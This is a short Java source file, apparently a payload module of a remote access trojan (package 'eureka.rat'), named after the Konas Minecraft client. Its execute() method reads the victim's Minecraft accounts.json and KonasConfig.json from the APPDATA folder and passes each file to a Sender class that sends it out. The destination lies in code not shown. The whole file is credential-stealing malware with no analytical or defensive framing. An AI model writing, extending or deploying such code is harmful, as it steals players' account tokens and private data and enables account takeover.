package eureka.rat.features;

import eureka.rat.utils.Sender;
import eureka.rat.payloads.Payload;

import java.io.File;
import java.util.Optional;

public class Konas implements Payload {
    @Override
    public void execute() throws Exception {
        Optional<File> accounts = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "accounts.json");
        accounts.ifPresent(Sender::send);

        Optional<File> waypoints = Sender.getFile(System.getenv("APPDATA") + "\\.minecraft\\" + "KonasConfig.json");
        waypoints.ifPresent(Sender::send);
    }
}
